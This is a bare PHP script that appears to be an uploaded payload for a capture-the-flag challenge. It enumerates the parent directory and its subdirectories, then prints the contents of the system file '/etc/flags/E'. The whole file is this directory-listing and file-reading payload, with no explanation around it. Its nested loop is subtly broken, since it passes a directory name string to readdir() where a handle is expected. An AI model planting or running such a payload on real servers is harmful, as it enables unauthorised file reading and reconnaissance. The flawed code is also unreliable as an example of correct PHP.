<?php
if ($handle = opendir('..')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "$entry\n";

            while (false != $thing = readdir($entry)) {

            	if ($thing != "." && $thing != "..") {

            		echo "$thing\n";

            	}
            }
        }
    }

    closedir($handle);
}
echo "\n";
echo "\n";
echo file_get_contents("/etc/flags/E");
?>
